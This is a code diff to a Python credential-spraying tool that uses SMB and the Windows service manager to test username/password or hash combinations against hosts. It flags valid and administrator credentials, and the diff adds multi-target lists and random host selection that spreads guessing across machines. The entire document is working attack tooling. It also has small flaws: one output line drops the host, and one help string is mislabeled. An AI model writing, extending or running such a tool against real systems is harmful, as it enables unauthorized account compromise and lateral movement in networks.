@@ -5,6 +5,7 @@ from time import sleep
 
 import argparse
 import logging
+import random
 import sys
 import os
 
@@ -45,10 +46,10 @@ def sendit(username, password, domain, remoteName, remoteHost, hashes=None,aesKe
             samr.connect()
         except Exception as e:
             if options.s == False:
-                print(red_minus, upasscombo.ljust(30), str(e)[:str(e).find("(")])
+                print(red_minus, remoteName.ljust(20), upasscombo.ljust(30), str(e)[:str(e).find("(")])
                 if options.o is not None:
                     with open(options.o, 'a') as f:
-                        f.write('{} {}\n'.format(upasscombo.ljust(30), str(e)[:str(e).find("(")]))
+                        f.write('{} {} {}\n'.format(remoteName.ljust(20), upasscombo.ljust(30), str(e)[:str(e).find("(")]))
                         f.close()
 
         s = rpctransport.get_smb_connection()
@@ -57,24 +58,24 @@ def sendit(username, password, domain, remoteName, remoteHost, hashes=None,aesKe
         resp = scmr.hROpenSCManagerW(samr)
         scHandle = resp['lpScHandle']
 
-        print(gold_plus, upasscombo.ljust(30), "Valid Admin Creds")
+        print(gold_plus, remoteName.ljust(20), upasscombo.ljust(30), "Valid Admin Creds")
         if options.o is not None:
              with open(options.o, 'a') as f:
-                 f.write('{} {}\n'.format(upasscombo.ljust(30), "Valid Admin Creds"))
+                 f.write('{} {} {}\n'.format(remoteName.ljust(20), upasscombo.ljust(30), "Valid Admin Creds"))
                  f.close()
 
     except  (Exception, KeyboardInterrupt) as e:
 
         if str(e).find("rpc_s_access_denied") != -1 and str(e).find("STATUS_OBJECT_NAME_NOT_FOUND") == -1:
-            print(green_plus, upasscombo.ljust(30), "Valid Creds")
+            print(green_plus, remoteName.ljust(20), upasscombo.ljust(30), "Valid Creds")
             if options.o is not None:
                 with open(options.o, 'a') as f:
-                    f.write('{} {}\n'.format(upasscombo.ljust(30), "Valid Creds"))
+                    f.write('{} {}\n'.format(remoteName.ljust(20), upasscombo.ljust(30), "Valid Creds"))
                     f.close()
 
-def mt_execute(username):  # multithreading requires a function
+def mt_execute(username, host_ip):  # multithreading requires a function
     try:
-        sendit(username, options.p, options.d, options.target, options.target, options.H, None, False, None, int(445))
+        sendit(username, options.p, options.d, host_ip, host_ip, options.H, None, False, None, int(445))
     except Exception as e:
         print(str(e))
         if options.o is not None:
@@ -98,6 +99,7 @@ if __name__ == '__main__':
     parser.add_argument('-delay', action='store', type=int, help='Number of seconds to wait between each account')
     parser.add_argument('target', action='store', help='IP to check the account against')
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
+    parser.add_argument('-method', action='store', choices=['random', 'sequence'], default='random',help='IP to check the account against')
 
     if len(sys.argv) == 1:
         parser.print_help()
@@ -125,6 +127,21 @@ if __name__ == '__main__':
         if options.H.find(':') == -1:
             options.H = ':' + options.H
 
+
+    targets = []
+    targets_cleaned = []
+
+    if os.path.isfile(options.target):
+        with open(options.target, 'r') as f:
+            targets = f.readlines()
+            f.close()
+
+        for item in targets:
+            item = item.replace("\r", "")
+            targets_cleaned.append(item.replace("\n", ""))
+    else:
+        targets_cleaned.append(options.target)
+
     users = []
     users_cleaned = []
 
@@ -141,10 +158,20 @@ if __name__ == '__main__':
 
     if options.delay is not None:
         options.threads = 1
+    if options.method == 'sequence':
+        with ProcessPool(max_workers=options.threads) as thread_exe:  # changed to pebble from concurrent futures because pebble supports timeout correctly
+            for curr_ip in targets_cleaned:
+                for username in users_cleaned:
+                    try:
+                        out = thread_exe.schedule(mt_execute, (username,curr_ip,), timeout=10)
+                    except Exception as e:
+                        print(str(e))
 
-    with ProcessPool(max_workers=options.threads) as thread_exe:  # changed to pebble from concurrent futures because pebble supports timeout correctly
-        for username in users_cleaned:
-            try:
-                out = thread_exe.schedule(mt_execute, (username,), timeout=10)
-            except Exception as e:
-                print(str(e))
+    else:
+        with ProcessPool(max_workers=options.threads) as thread_exe:  # changed to pebble from concurrent futures because pebble supports timeout correctly
+            for username in users_cleaned:
+                curr_ip = targets_cleaned[random.randint(0, len(targets_cleaned)-1)]
+                try:
+                    out = thread_exe.schedule(mt_execute, (username,curr_ip,), timeout=10)
+                except Exception as e:
+                    print(str(e))
